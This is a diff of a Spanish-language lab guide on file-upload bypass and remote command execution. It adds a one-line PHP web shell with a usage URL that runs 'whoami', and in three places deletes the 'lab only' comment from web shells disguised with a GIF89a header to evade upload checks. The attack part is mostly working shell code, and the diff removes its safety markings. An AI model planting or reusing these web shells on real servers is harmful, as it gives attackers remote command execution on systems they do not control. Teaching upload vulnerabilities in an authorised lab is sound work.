@@ -3,6 +3,18 @@
 > Uso exclusivo en un entorno de laboratorio propio, aislado y autorizado.
 > Estos ejemplos forman parte de una práctica didáctica sobre subida de archivos, bypass de validaciones débiles, ejecución remota de comandos y post-explotación básica.
 
+```bash
+<?php
+    system($_GET['cmd']);
+?>
+```
+
+ejemplo de uso:
+
+```text
+http://<IP_SERVIDOR>:8080/shell.php?cmd=whoami
+```
+
 ---
 
 ## Contexto
@@ -54,7 +66,6 @@ Aunque el fichero contiene código PHP, comienza con la cabecera `GIF89a` para s
 ```php
 GIF89a
 <?php
-// terminal.php - SOLO PARA LABORATORIO CONTROLADO
 
 if (isset($_GET['cmd'])) {
     $cmd = $_GET['cmd'];
@@ -231,7 +242,6 @@ Esta variante muestra en pantalla tanto el comando ejecutado como su resultado. 
 ```php
 GIF89a
 <?php
-// terminal.php - SOLO PARA LABORATORIO CONTROLADO
 
 if (isset($_GET['cmd'])) {
     $cmd = $_GET['cmd'];
@@ -372,7 +382,6 @@ Webshell por parámetro URL sin disfraz GIF.
 
 ```php
 <?php
-// terminal.php - SOLO PARA LABORATORIO CONTROLADO
 
 if (isset($_GET['cmd'])) {
     $cmd = $_GET['cmd'];
